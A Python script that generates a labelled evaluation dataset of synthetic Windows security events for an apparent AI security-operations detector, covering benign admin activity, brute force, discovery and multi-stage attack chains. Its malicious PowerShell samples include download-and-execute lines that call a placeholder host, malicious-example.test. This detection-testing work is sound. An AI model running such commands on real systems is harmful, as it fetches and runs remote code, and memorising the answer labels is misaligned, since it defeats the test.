import json
from pathlib import Path


BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUT_FILE = BASE_DIR / "data" / "evaluation_scenarios.json"


def event(
    timestamp,
    event_id,
    event_type,
    source="WS-001",
    username=None,
    source_ip=None,
    destination_ip=None,
    process=None,
    command_line=None,
    message=None,
):
    return {
        "timestamp": timestamp,
        "event_id": event_id,
        "event_type": event_type,
        "source": source,
        "username": username,
        "source_ip": source_ip,
        "destination_ip": destination_ip,
        "process": process,
        "command_line": command_line,
        "message": message,
    }


def create_scenarios():

    scenarios = []

    # =========================================================
    # BENIGN ACTIVITY
    # =========================================================

    benign_powershell = [
        "Get-Service",
        "Get-Process",
        "Get-Date",
        "Get-ComputerInfo",
        "Get-ChildItem C:\\Users",
    ]

    for index, command in enumerate(
        benign_powershell,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"B{index:02d}",
                "name": "Legitimate Administrative PowerShell",
                "ground_truth": "BENIGN",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [
                    event(
                        "2026-09-09T09:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-ADMIN",
                        username="admin",
                        source_ip="10.10.10.10",
                        process="powershell.exe",
                        command_line=f"powershell.exe -NoProfile -Command {command}",
                        message="Legitimate administrative PowerShell activity",
                    )
                ],
            }
        )

    # Normal successful logins
    for index in range(6, 11):

        scenarios.append(
            {
                "scenario_id": f"B{index:02d}",
                "name": "Normal User Authentication",
                "ground_truth": "BENIGN",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [
                    event(
                        "2026-09-09T10:00:00Z",
                        4624,
                        "Successful Login",
                        source="WS-USER",
                        username=f"user{index}",
                        source_ip="10.10.10.20",
                        message="Normal successful authentication",
                    )
                ],
            }
        )

    # Normal browser activity
    for index in range(11, 16):

        scenarios.append(
            {
                "scenario_id": f"B{index:02d}",
                "name": "Normal Browser Activity",
                "ground_truth": "BENIGN",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [
                    event(
                        "2026-09-09T11:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-USER",
                        username=f"user{index}",
                        source_ip="10.10.10.30",
                        process="chrome.exe",
                        command_line="chrome.exe",
                        message="Normal browser process",
                    )
                ],
            }
        )

    # =========================================================
    # MALICIOUS - POWERHELL ABUSE
    # =========================================================

    malicious_powershell = [

        "powershell.exe -enc SQBFAFgA",
        "powershell.exe -EncodedCommand SQBFAFgA",
        "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious-example.test/payload')",
        "powershell.exe -Command Invoke-WebRequest http://malicious-example.test/payload",
        "powershell.exe -WindowStyle Hidden -Command IEX $payload",
    ]

    for index, command in enumerate(
        malicious_powershell,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"M{index:02d}",
                "name": "Malicious PowerShell Execution",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001"
                ],
                "expected_risk": "HIGH",
                "events": [
                    event(
                        "2026-09-09T12:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-VICTIM",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="powershell.exe",
                        command_line=command,
                        message="Suspicious PowerShell execution",
                    )
                ],
            }
        )

    # =========================================================
    # MALICIOUS - BRUTE FORCE
    # =========================================================

    for index in range(6, 11):

        failed_events = []

        for attempt in range(4):

            failed_events.append(
                event(
                    f"2026-09-09T13:0{attempt}:00Z",
                    4625,
                    "Failed Login",
                    source="SRV-DC01",
                    username="administrator",
                    source_ip="10.10.20.99",
                    message="Repeated failed authentication attempt",
                )
            )

        scenarios.append(
            {
                "scenario_id": f"M{index:02d}",
                "name": "Brute Force Attack",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1110"
                ],
                "expected_risk": "HIGH",
                "events": failed_events,
            }
        )

    # =========================================================
    # SUSPICIOUS DISCOVERY
    # =========================================================

    discovery_commands = [
        "cmd.exe /c whoami",
        "cmd.exe /c ipconfig",
        "cmd.exe /c systeminfo",
        "cmd.exe /c tasklist",
        "cmd.exe /c net user",
    ]

    for index, command in enumerate(
        discovery_commands,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"S{index:02d}",
                "name": "Isolated System Discovery",
                "ground_truth": "SUSPICIOUS",
                "expected_attack": False,
                "expected_techniques": [
                    "T1033"
                ],
                "expected_risk": "LOW",
                "events": [
                    event(
                        "2026-09-09T14:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-USER",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="cmd.exe",
                        command_line=command,
                        message="System discovery command observed",
                    )
                ],
            }
        )

    # =========================================================
    # SUSPICIOUS EXTERNAL COMMUNICATION
    # =========================================================

    external_ips = [
        "203.0.113.50",
        "198.51.100.25",
        "185.199.108.153",
        "203.0.113.80",
        "198.51.100.80",
    ]

    for index, destination in enumerate(
        external_ips,
        start=6,
    ):

        scenarios.append(
            {
                "scenario_id": f"S{index:02d}",
                "name": "Suspicious External Communication",
                "ground_truth": "SUSPICIOUS",
                "expected_attack": False,
                "expected_techniques": [
                    "T1071"
                ],
                "expected_risk": "LOW",
                "events": [
                    event(
                        "2026-09-09T15:00:00Z",
                        5156,
                        "Network Connection",
                        source="WS-NET",
                        username="bob",
                        source_ip="10.10.20.15",
                        destination_ip=destination,
                        message="Outbound external network connection",
                    )
                ],
            }
        )

    # =========================================================
    # MALICIOUS - DISCOVERY + POWERSHELL CORRELATION
    # =========================================================

    for index in range(11, 16):

        scenarios.append(
            {
                "scenario_id": f"M{index:02d}",
                "name": "Malicious Discovery Activity",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001",
                    "T1033",
                    "T1071",
                ],
                "expected_risk": "HIGH",
                "events": [

                    event(
                        "2026-09-09T16:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-COMPROMISED",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="powershell.exe",
                        command_line="powershell.exe -enc SQBFAFgA",
                        message="Suspicious PowerShell execution",
                    ),

                    event(
                        "2026-09-09T16:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-COMPROMISED",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="cmd.exe",
                        command_line="cmd.exe /c whoami",
                        message="System owner discovery",
                    ),

                    event(
                        "2026-09-09T16:02:00Z",
                        5156,
                        "Network Connection",
                        source="WS-COMPROMISED",
                        username="alice",
                        source_ip="10.10.20.15",
                        destination_ip="203.0.113.50",
                        message="External communication after discovery",
                    ),
                ],
            }
        )

    # =========================================================
    # MULTI-STAGE ATTACK CHAINS
    # =========================================================

    for index in range(1, 6):

        scenarios.append(
            {
                "scenario_id": f"A{index:02d}",
                "name": "Multi-Stage Attack Chain",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001",
                    "T1033",
                    "T1110",
                    "T1071",
                ],
                "expected_risk": "CRITICAL",
                "events": [

                    event(
                        "2026-09-09T17:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-ATTACK",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="powershell.exe",
                        command_line="powershell.exe -enc SQBFAFgA",
                        message="Encoded PowerShell execution",
                    ),

                    event(
                        "2026-09-09T17:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-ATTACK",
                        username="alice",
                        source_ip="10.10.20.15",
                        process="cmd.exe",
                        command_line="cmd.exe /c whoami",
                        message="System discovery",
                    ),

                    event(
                        "2026-09-09T17:02:00Z",
                        4625,
                        "Failed Login",
                        source="SRV-DC01",
                        username="administrator",
                        source_ip="10.10.20.99",
                        message="Authentication attack activity",
                    ),

                    event(
                        "2026-09-09T17:03:00Z",
                        5156,
                        "Network Connection",
                        source="WS-ATTACK",
                        username="alice",
                        source_ip="10.10.20.15",
                        destination_ip="203.0.113.50",
                        message="External communication",
                    ),
                ],
            }
        )

    # =========================================================
    # BENIGN WITH SECURITY NOISE
    # =========================================================

    for index in range(1, 6):

        scenarios.append(
            {
                "scenario_id": f"N{index:02d}",
                "name": "Benign Activity With Security Noise",
                "ground_truth": "BENIGN_WITH_NOISE",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [

                    event(
                        "2026-09-09T18:00:00Z",
                        4624,
                        "Successful Login",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.10.10.50",
                        message="Successful user login",
                    ),

                    event(
                        "2026-09-09T18:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.10.10.50",
                        process="chrome.exe",
                        command_line="chrome.exe",
                        message="Normal browser activity",
                    ),

                    event(
                        "2026-09-09T18:02:00Z",
                        4688,
                        "Process Creation",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.10.10.50",
                        process="cmd.exe",
                        command_line="cmd.exe /c whoami",
                        message="Routine user identity check",
                    ),
                ],
            }
        )

    return scenarios


if __name__ == "__main__":

    scenarios = create_scenarios()

    OUTPUT_FILE.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    with open(
        OUTPUT_FILE,
        "w",
        encoding="utf-8",
    ) as file:

        json.dump(
            scenarios,
            file,
            indent=2,
        )

    counts = {}

    for scenario in scenarios:

        label = scenario[
            "ground_truth"
        ]

        counts[label] = (
            counts.get(label, 0) + 1
        )

    print("=" * 70)
    print(
        "AGENTIC AI-SOC - EVALUATION DATASET V3"
    )
    print("=" * 70)

    print(
        f"Total scenarios : {len(scenarios)}"
    )

    for label, count in counts.items():

        print(
            f"{label:<22}: {count}"
        )

    print()
    print(
        "Dataset saved to:"
    )
    print(
        OUTPUT_FILE
    )

    print("=" * 70)